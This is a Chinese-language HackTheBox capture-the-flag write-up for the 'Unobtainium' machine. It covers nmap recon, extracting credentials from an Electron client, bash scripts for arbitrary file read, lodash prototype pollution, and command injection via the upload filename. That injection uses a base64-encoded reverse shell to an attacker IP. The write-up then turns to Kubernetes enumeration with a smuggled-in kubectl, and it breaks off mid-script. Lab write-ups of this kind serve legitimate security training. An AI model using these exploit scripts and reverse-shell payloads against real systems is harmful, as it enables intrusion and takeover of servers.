Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1\n| Not valid before: 2021-07-14T05:10:38\n|_Not valid after:  2022-07-15T05:10:38\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|   h2\n|_  http/1.1\n10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n| ssl-cert: Subject: commonName=unobtainium@1610865428\n| Subject Alternative Name: DNS:unobtainium\n| Not valid before: 2021-01-17T05:37:08\n|_Not valid after:  2022-01-17T05:37:08\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|   h2\n|_  http/1.1\n10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n31337/tcp open  http             Node.js Express framework\n| http-methods:\n|_  Potentially risky methods: PUT DELETE\n|_http-title: Site doesn't have a title (application/json; charset=utf-8).\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/15%Time=60F04857%P=x86_64-pc-linux-gn\nSF:u%r(GetRequest,1FF,\"HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-Control:\\x20\nSF:no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\nX-Content-\nSF:Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x203082aa7f\nSF:-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20c\nSF:4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x20Jul\\x2020\nSF:21\\x2014:50:42\\x20GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n{\\\"kind\\\":\\\"Stat\nSF:us\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\":{},\\\"status\\\":\\\"Failure\\\",\\\"mes\nSF:sage\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"system:anonymous\\\\\\\"\\x20cannot\\x20ge\nSF:t\\x20path\\x20\\\\\\\"/\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"details\\\":{},\\\"code\nSF:\\\":403}\\n\")%r(HTTPOptions,203,\"HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-C\nSF:ontrol:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\\nSF:nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\\nSF:x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Priorityleve\nSF:l-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x\nSF:20Jul\\x202021\\x2014:50:43\\x20GMT\\r\\nContent-Length:\\x20189\\r\\n\\r\\n{\\\"ki\nSF:nd\\\":\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\":{},\\\"status\\\":\\\"Fail\nSF:ure\\\",\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"system:anonymous\\\\\\\"\\x20c\nSF:annot\\x20options\\x20path\\x20\\\\\\\"/\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"deta\nSF:ils\\\":{},\\\"code\\\":403}\\n\")%r(FourOhFourRequest,21A,\"HTTP/1\\.0\\x20403\\x2\nSF:0Forbidden\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x\nSF:20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernete\nSF:s-Pf-Flowschema-Uid:\\x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kuber\nSF:netes-Pf-Prioritylevel-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\n\nSF:Date:\\x20Thu,\\x2015\\x20Jul\\x202021\\x2014:50:44\\x20GMT\\r\\nContent-Length\nSF::\\x20212\\r\\n\\r\\n{\\\"kind\\\":\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\"\nSF::{},\\\"status\\\":\\\"Failure\\\",\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"syst\nSF:em:anonymous\\\\\\\"\\x20cannot\\x20get\\x20path\\x20\\\\\\\"/nice\\x20ports,/Trinit\nSF:y\\.txt\\.bak\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"details\\\":{},\\\"code\\\":403}\nSF:\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T\nSF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\nSF:\\x20Bad\\x20Request\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/15%OT=22%CT=1%CU=43753%PV=Y%DS=2%DC=T%G=Y%TM=60F048D\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   271.92 ms 10.10.14.1\n2   271.99 ms 10.10.10.235\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1914.83 seconds\n```\n从上面的扫描结果，我们可以得到几个关键信息 - 本台靶机开启了`22`，`80`，`2379`，`2380`，`8443`，`10250`，`10256`，`31337`端口 - 其中`80`，`2379`，`2380`，`8443`，`10250`，`10256`，`31337`都是http服务 - `8443`端口给出了两个关键信息 `/nice` `/Trinity.txt.bak` - `31337`端口存在`PUT`和`DELETE`风险\n\n咱们先去80端口看看\n\n```Plain Text\nhttp://10.10.10.235/\n```\n![](Hackthebox-Unobtanium/image3.png)\n\n它声称这是一个聊天程序，并给了三个下载地址，咱们给它下载下来，同时FUZZ一下目录\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -u http://10.10.10.235 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.235\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              txt,php,html\n[+] Timeout:                 10s\n===============================================================\n2021/07/16 16:33:21 Starting gobuster in directory enumeration mode\n===============================================================\n/.htpasswd.php        (Status: 403) [Size: 277]\n/.hta                 (Status: 403) [Size: 277]\n/.htaccess            (Status: 403) [Size: 277]\n/.htpasswd.html       (Status: 403) [Size: 277]\n/.hta.txt             (Status: 403) [Size: 277]\n/.htaccess.php        (Status: 403) [Size: 277]\n/.htpasswd.txt        (Status: 403) [Size: 277]\n/.hta.php             (Status: 403) [Size: 277]\n/.htaccess.html       (Status: 403) [Size: 277]\n/.htaccess.txt        (Status: 403) [Size: 277]\n/.htpasswd            (Status: 403) [Size: 277]\n/.hta.html            (Status: 403) [Size: 277]\n/LICENSE.txt          (Status: 200) [Size: 17128]\n/README.txt           (Status: 200) [Size: 711]\n/assets               (Status: 301) [Size: 313] [--> http://10.10.10.235/assets/]\n/downloads            (Status: 301) [Size: 316] [--> http://10.10.10.235/downloads/]\n/index.html           (Status: 200) [Size: 1988]\n/index.html           (Status: 200) [Size: 1988]\n/images               (Status: 301) [Size: 313] [--> http://10.10.10.235/images/]\n/server-status        (Status: 403) [Size: 277]\n\n===============================================================\n2021/07/16 16:33:58 Finished\n===============================================================\n```\n当fuzz完的时候，三个文件也下载完了，咱们去看一下\n\n```Plain Text\n┌──(root💀root)-[~/Downloads]\n└─# ls\nunobtainium_debian.zip  unobtainium_redhat.zip  unobtainium_snap.zip\n```\n让我们提取deb包中的文件，而不安装它\n\n```Plain Text\nmkdir test\nunzip unobtainium_debian.zip\ndpkg-deb -xv unobtainium_1.0.0_amd64.deb test\ncd test\n```\n```Plain Text\n┌──(root💀root)-[~/Downloads/test]\n└─# tree\n.\n├── opt\n│   └── unobtainium\n│       ├── chrome_100_percent.pak\n│       ├── chrome_200_percent.pak\n│       ├── chrome-sandbox\n│       ├── icudtl.dat\n│       ├── libEGL.so\n│       ├── libffmpeg.so\n│       ├── libGLESv2.so\n│       ├── libvk_swiftshader.so\n│       ├── libvulkan.so\n│       ├── LICENSE.electron.txt\n│       ├── LICENSES.chromium.html\n│       ├── locales\n│       │   ├── am.pak\n│       │   ├── ar.pak\n│       │   ├── bg.pak\n│       │   ├── bn.pak\n│       │   ├── ca.pak\n│       │   ├── cs.pak\n│       │   ├── da.pak\n│       │   ├── de.pak\n│       │   ├── el.pak\n│       │   ├── en-GB.pak\n│       │   ├── en-US.pak\n│       │   ├── es-419.pak\n│       │   ├── es.pak\n│       │   ├── et.pak\n│       │   ├── fa.pak\n│       │   ├── fil.pak\n│       │   ├── fi.pak\n│       │   ├── fr.pak\n│       │   ├── gu.pak\n│       │   ├── he.pak\n│       │   ├── hi.pak\n│       │   ├── hr.pak\n│       │   ├── hu.pak\n│       │   ├── id.pak\n│       │   ├── it.pak\n│       │   ├── ja.pak\n│       │   ├── kn.pak\n│       │   ├── ko.pak\n│       │   ├── lt.pak\n│       │   ├── lv.pak\n│       │   ├── ml.pak\n│       │   ├── mr.pak\n│       │   ├── ms.pak\n│       │   ├── nb.pak\n│       │   ├── nl.pak\n│       │   ├── pl.pak\n│       │   ├── pt-BR.pak\n│       │   ├── pt-PT.pak\n│       │   ├── ro.pak\n│       │   ├── ru.pak\n│       │   ├── sk.pak\n│       │   ├── sl.pak\n│       │   ├── sr.pak\n│       │   ├── sv.pak\n│       │   ├── sw.pak\n│       │   ├── ta.pak\n│       │   ├── te.pak\n│       │   ├── th.pak\n│       │   ├── tr.pak\n│       │   ├── uk.pak\n│       │   ├── vi.pak\n│       │   ├── zh-CN.pak\n│       │   └── zh-TW.pak\n│       ├── resources\n│       │   └── app.asar\n│       ├── resources.pak\n│       ├── snapshot_blob.bin\n│       ├── swiftshader\n│       │   ├── libEGL.so\n│       │   └── libGLESv2.so\n│       ├── unobtainium\n│       ├── v8_context_snapshot.bin\n│       └── vk_swiftshader_icd.json\n└── usr\n    └── share\n        ├── applications\n        │   └── unobtainium.desktop\n        ├── doc\n        │   └── unobtainium\n        │       └── changelog.gz\n        └── icons\n            └── hicolor\n                ├── 128x128\n                │   └── apps\n                │       └── unobtainium.png\n                ├── 16x16\n                │   └── apps\n                │       └── unobtainium.png\n                ├── 256x256\n                │   └── apps\n                │       └── unobtainium.png\n                ├── 32x32\n                │   └── apps\n                │       └── unobtainium.png\n                ├── 48x48\n                │   └── apps\n                │       └── unobtainium.png\n                └── 64x64\n                    └── apps\n                        └── unobtainium.png\n\n24 directories, 80 files\n```\n在`/test/opt/unobtainium`中，有一个名为`unobtainium`的可执行文件，让我们执行它\n\n```Plain Text\n./unobtainium --no-sandbox\n```\n得到了错误\n\n![](Hackthebox-Unobtanium/image4.png)\n\n让我们添加一下域名\n\n```Plain Text\necho 10.10.10.235 unobtainium.htb >> /etc/hosts\n```\n然后再执行一次\n\n这次运行正常了\n\n当我使用`Wireshark`监听tun0的时候，在`Unobtainium Chat`中点击`Todo`即可捕捉到流量包\n\n```Plain Text\nPOST /todo HTTP/1.1\nHost: unobtainium.htb:31337\nConnection: keep-alive\nContent-Length: 73\nAccept: application/json, text/javascript, */*; q=0.01\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN\n\n{\"auth\":{\"name\":\"felamos\",\"password\":\"Winter2021\"},\"filename\":\"todo.txt\"}HTTP/1.1 200 OK\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 293\nETag: W/\"125-tNs2+nU0UiQGmLreBy4Pj891aVA\"\nDate: Fri, 16 Jul 2021 09:49:16 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{\"ok\":true,\"content\":\"1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\\n7. Improve security\\n\"}\n```\n似乎Todo函数具有从服务器读取文件的能力。\n\n我找到一个脚本来检查是否可以从服务器读取文件。\n\n我还运行了Burp来捕获请求 ## 漏洞利用 在运行脚本之前，我们需要安装需要的环境\n\n```Plain Text\napt-get install jq\n```\n```Plain Text\n#!/bin/bash\n\nRHOST=\"unobtainium.htb\"\nRPORT=31337\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nFILE=$1\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"${FILE}\"\n}\nEOF\n\nCONTENT=\"$(curl -s \\\n                -A \"${UA}\" \\\n                -H \"Content-Type: application/json\" \\\n                -d \"$(cat message.json | jq -c)\" \\\n                -x \"${PROXY}\" \\\n                http://${RHOST}:${RPORT}/todo \\\n           | jq .content \\\n           | sed -e 's/^.//' -e 's/.$//')\"\n\nprintf \"$CONTENT\"\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ./read.sh\n\n┌──(root💀root)-[~/Desktop]\n└─# cat message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"\"\n}\n\n```\n咱们使用burp捕捉一下流量试试\n\n![](Hackthebox-Unobtanium/image5.png)\n\n成功让我们查看一下\n\n```Plain Text\nindex.js\n```\n的内容\n\n![](Hackthebox-Unobtanium/image6.png)\n\n```Plain Text\n{\"ok\":true,\"content\":\"var root = require(\\\"google-cloudstorage-commands\\\");\\nconst express = require('express');\\nconst { exec } = require(\\\"child_process\\\");     \\nconst bodyParser = require('body-parser');     \\nconst _ = require('lodash');                                                                  \\nconst app = express();\\nvar fs = require('fs');\\n                                                                                              \\nconst users = [                                                                               \\n  {name: 'felamos', password: 'Winter2021'},\\n  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      \\n];\\n\\nlet messages = [];                             \\nlet lastId = 1;                                \\n                                                                                              \\nfunction findUser(auth) {                                                                     \\n  return users.find((u) =>                                                                    \\n    u.name === auth.name &&                                                                   \\n    u.password === auth.password);                                                            \\n}                                    \\n                                               \\napp.use(bodyParser.json());                                                                   \\n                                               \\napp.get('/', (req, res) => {                   \\n  res.send(messages);                                                                         \\n});                                                                                           \\n                                                                                              \\napp.put('/', (req, res) => {   \\n  const user = findUser(req.body.auth || {});                                                 \\n                                               \\n  if (!user) {                                 \\n    res.status(403).send({ok: false, error: 'Access denied'});                                \\n    return;\\n  }\\n\\n  const message = {\\n    icon: '__',\\n  };\\n\\n  _.merge(message, req.body.message, {\\n    id: lastId++,\\n    timestamp: Date.now(),\\n    userName: user.name,\\n  });\\n\\n  messages.push(message);\\n  res.send({ok: true});\\n});\\n\\napp.delete('/', (req, res) => {\\n  const user = findUser(req.body.auth || {});\\n\\n  if (!user || !user.canDelete) {\\n    res.status(403).send({ok: false, error: 'Access denied'});\\n    return;\\n  }\\n\\n  messages = messages.filter((m) => m.id !== req.body.messageId);\\n  res.send({ok: true});\\n});\\napp.post('/upload', (req, res) => {\\n  const user = findUser(req.body.auth || {});\\n  if (!user || !user.canUpload) {\\n    res.status(403).send({ok: false, error: 'Access denied'});\\n    return;\\n  }\\n\\n\\n  filename = req.body.filename;\\n  root.upload(\\\"./\\\",filename, true);\\n  res.send({ok: true, Uploaded_File: filename});\\n});\\n\\napp.post('/todo', (req, res) => {\\n\\tconst user = findUser(req.body.auth || {});\\n\\tif (!user) {\\n\\t\\tres.status(403).send({ok: false, error: 'Access denied'});\\n\\t\\treturn;\\n\\t}\\n\\n\\tfilename = req.body.filename;\\n        testFolder = \\\"/usr/src/app\\\";\\n        fs.readdirSync(testFolder).forEach(file => {\\n                if (file.indexOf(filename) > -1) {\\n                        var buffer = fs.readFileSync(filename).toString();\\n                        res.send({ok: true, content: buffer});\\n                }\\n        });\\n});\\n\\napp.listen(3000);\\nconsole.log('Listening on port 3000...');\\n\"}\n```\n这个格式是真的糟糕，为了方便阅读，我们给它美化一下\n\n```Plain Text\nvar root = require(\"google-cloudstorage-commands\");\nconst express = require('express');\nconst { exec } = require(\"child_process\");\nconst bodyParser = require('body-parser');\nconst _ = require('lodash');\nconst app = express();\nvar fs = require('fs');\n\nconst users = [\n {name: 'felamos', password: 'Winter2021'},\n {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},\n];\n\nlet messages = [];\nlet lastId = 1;\n\nfunction findUser(auth) {\n return users.find((u) =>\n u.name === auth.name &&\n u.password === auth.password);\n}\n\napp.use(bodyParser.json());\n\napp.get('/', (req, res) => {\n res.send(messages);\n});\n\napp.put('/', (req, res) => {\n const user = findUser(req.body.auth || {});\n\n if (!user) {\n res.status(403).send({ok: false, error: 'Access denied'});\n return;\n }\n\n const message = {\n icon: '__',\n };\n\n _.merge(message, req.body.message, {\n id: lastId++,\n timestamp: Date.now(),\n userName: user.name,\n });\n\n messages.push(message);\n res.send({ok: true});\n});\n\napp.delete('/', (req, res) => {\n const user = findUser(req.body.auth || {});\n\n if (!user || !user.canDelete) {\n res.status(403).send({ok: false, error: 'Access denied'});\n return;\n }\n\n messages = messages.filter((m) => m.id !== req.body.messageId);\n res.send({ok: true});\n});\napp.post('/upload', (req, res) => {\n const user = findUser(req.body.auth || {});\n if (!user || !user.canUpload) {\n res.status(403).send({ok: false, error: 'Access denied'});\n return;\n }\n\n filename = req.body.filename;\n root.upload(\"./\",filename, true);\n res.send({ok: true, Uploaded_File: filename});\n});\n\napp.post('/todo', (req, res) => {\n        const user = findUser(req.body.auth || {});\n        if (!user) {\n                res.status(403).send({ok: false, error: 'Access denied'});\n                return;\n        }\n\n        filename = req.body.filename;\n testFolder = \"/usr/src/app\";\n fs.readdirSync(testFolder).forEach(file => {\n if (file.indexOf(filename) > -1) {\n var buffer = fs.readFileSync(filename).toString();\n res.send({ok: true, content: buffer});\n }\n });\n});\n\napp.listen(3000);\nconsole.log('Listening on port 3000...');\n```\n我们读取文件`package.json`，得到了\n\n```Plain Text\n{\"ok\":true,\"content\":\"{\\n  \\\"name\\\": \\\"Unobtainium-Server\\\",\\n  \\\"version\\\": \\\"1.0.0\\\",\\n  \\\"description\\\": \\\"API Service for Electron client\\\",\\n  \\\"main\\\": \\\"index.js\\\",\\n  \\\"scripts\\\": {\\n    \\\"start\\\": \\\"node index.js\\\"\\n  },\\n  \\\"author\\\": \\\"felamos\\\",\\n  \\\"license\\\": \\\"ISC\\\",\\n  \\\"dependencies\\\": {\\n    \\\"body-parser\\\": \\\"1.18.3\\\",\\n    \\\"express\\\": \\\"4.16.4\\\",\\n    \\\"lodash\\\": \\\"4.17.4\\\",\\n    \\\"google-cloudstorage-commands\\\": \\\"0.0.1\\\"\\n  },\\n  \\\"devDependencies\\\": {}\\n}\\n\"}\n```\n我们美化一下\n\n```Plain Text\n{\n  \"name\": \"Unobtainium-Server\",\n  \"version\": \"1.0.0\",\n  \"description\": \"API Service for Electron client\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"node index.js\"\n  },\n  \"author\": \"felamos\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"body-parser\": \"1.18.3\",\n    \"express\": \"4.16.4\",\n    \"lodash\": \"4.17.4\",\n    \"google-cloudstorage-commands\": \"0.0.1\"\n  },\n  \"devDependencies\": {}\n}\n```\n> Lodashhttps://snyk.io/vuln/SNYK-JS-LODASH-73638\n\n> google-cloudstorage-commandshttps://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431\n\n从上面的帮助文档，我发现可以命令注入\n\n```Plain Text\n#!/bin/bash\n\nRHOST=\"unobtainium.htb\"\nRPORT=31337\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nTEXT=\"$1\"\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"message\":\n    {\n        \"text\":${TEXT}\n    }\n}\nEOF\n\ncurl -s \\\n     -X PUT \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     \"http://${RHOST}:${RPORT}/\" \\\n| jq .\n```\n```Plain Text\n(root💀root)-[~/Desktop]\n└─# ./exploit.sh '{\"constructor\":{\"prototype\":{\"canDelete\":true, \"canUpload\":true}}}'\n{\n  \"ok\": true\n}\n```\n成功\n\n这个成功的响应意味着我们真的可以利用这个漏洞，让我们运行脚本2检查是否可以写入文件\n\n```Plain Text\n#!/bin/bash\n\nRHOST=\"unobtainium.htb\"\nRPORT=31337\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nFILE=\"& echo lucifiel | tee lucifiel.txt\"\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"${FILE}\"\n}\nEOF\n\ncurl -s \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     -o /dev/null \\\n     \"http://${RHOST}:${RPORT}/upload\"\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ./exploit2.sh\n```\n运行成功，让我们读取\n\n```Plain Text\nlucifiel.txt\n```\n试试是否写入成功\n\n![](Hackthebox-Unobtanium/image7.png)\n\n写入成功，现在我们来利用这个漏洞getshell\n\n首先使用nc监听一个端口\n\n```Plain Text\nnc -nvlp 4444\n```\n```Plain Text\nPOST /upload HTTP/1.1\n\nHost: unobtainium.htb:31337\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\n\nAccept: */*\n\nContent-Type: application/json\n\nContent-Length: 151\n\nConnection: close\n\n{\"auth\":{\"name\":\"felamos\",\"password\":\"Winter2021\"},\"filename\":\"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1' | base64) | base64 -d | bash\"}\n```\n执行后，成功获得一个shell\n\n```Plain Text\n┌──(root💀root)-[~/Downloads]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58362\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@webapp-deployment-5d764566f4-mbprj:/usr/src/app# whoami && id\nwhoami && id\nroot\nuid=0(root) gid=0(root) groups=0(root)\nroot@webapp-deployment-5d764566f4-mbprj:/usr/src/app#\n```\n```Plain Text\nroot@webapp-deployment-5d764566f4-mbprj:~# cd /root\ncd /root\nroot@webapp-deployment-5d764566f4-mbprj:~# ls\nls\nuser.txt\nroot@webapp-deployment-5d764566f4-mbprj:~# cat user.txt\ncat user.txt\n7ff2ddd449da8a15c66289e2ec015cd9\n```\n成功拿到user权限的flag ## 权限提升 我们可以看到，这里的root是在一个docker容器里\n\n因为没啥思路，让我们先跑一下linpeas吧 \n\n> https://github.com/LucifielHack/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh\n\n使用python3在本地开启一个http服务\n\n```Plain Text\npython3 -m http.server\n```\n然后在shell中使用wget进行下载\n\n```Plain Text\nwget http://10.10.14.53:8000/linpeas.sh\n```\n然后添加权限后运行\n\n```Plain Text\nchmod +x linpeas.sh\n./linpeas.sh\n```\n在结果中看到了一句\n\n```Plain Text\n* * * * * find / -name kubectl -exec rm {} \\;\n* * * * * find / -name kubectl -exec rm {} \\;\n```\n有一个`cronjob`正在运行，每分钟删除容器中的`kubectl`\n\n但是容器中没有`kubectl`可执行文件\n\n让我们下载一个`kubectl`可执行文件并将其传输到`/tmp`文件夹内的`docker`中 \n\n> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux\n\n> 在Linux上使用curl安装kubectl二进制文件\n\n```Plain Text\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\npython3 -m http.server 80\n```\n然后在shell中使用wget进行下载\n\n```Plain Text\nwget http://10.10.14.53/kubectl -o /tmp/kubectl-lucifiel\ncd /tmp/\nchmod +x kubectl-lucifiel\n```\n更改一个名字避免被cronjob给删掉\n\n首先让我们检查一下kubectl\n\n```Plain Text\n./kubectl-lucifiel get namespace\n./kubectl-lucifiel get pods -n dev\n./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev\n```\n```Plain Text\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace\n<4566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace\nNAME              STATUS   AGE\ndefault           Active   180d\ndev               Active   179d\nkube-node-lease   Active   180d\nkube-public       Active   180d\nkube-system       Active   180d\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev\n<66f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev\nNAME                                READY   STATUS    RESTARTS   AGE\ndevnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         179d\ndevnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         179d\ndevnode-deployment-cd86fb5c-qlxww   1/1     Running   29         179d\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev\n<scribe pod devnode-deployment-cd86fb5c-6ms8d -n dev\nName:         devnode-deployment-cd86fb5c-6ms8d\nNamespace:    dev\nPriority:     0\nNode:         unobtainium/10.10.10.235\nStart Time:   Sun, 17 Jan 2021 18:16:21 +0000\nLabels:       app=devnode\n              pod-template-hash=cd86fb5c\nAnnotations:  <none>\nStatus:       Running\nIP:           172.17.0.8\nIPs:\n  IP:           172.17.0.8\nControlled By:  ReplicaSet/devnode-deployment-cd86fb5c\nContainers:\n  devnode:\n    Container ID:   docker://c22604a2e5d200e2d08b41724e76633954e82ba9d5f4ab201207860f9dc9b91f\n    Image:          localhost:5000/node_server\n    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c\n    Port:           3000/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Fri, 16 Jul 2021 05:11:42 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    137\n      Started:      Wed, 24 Mar 2021 16:01:28 +0000\n      Finished:     Wed, 24 Mar 2021 16:02:13 +0000\n    Ready:          True\n    Restart Count:  28\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-rmcd6:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-rmcd6\n    Optional:    false\nQoS Class:       BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s\n                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s\nEvents:          <none>\n```\n利用方法和前面一样，稍微修改一下脚本\n\n```Plain Text\n#!/bin/bash\n\nRHOST=\"127.0.0.1\"\nRPORT=3000\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 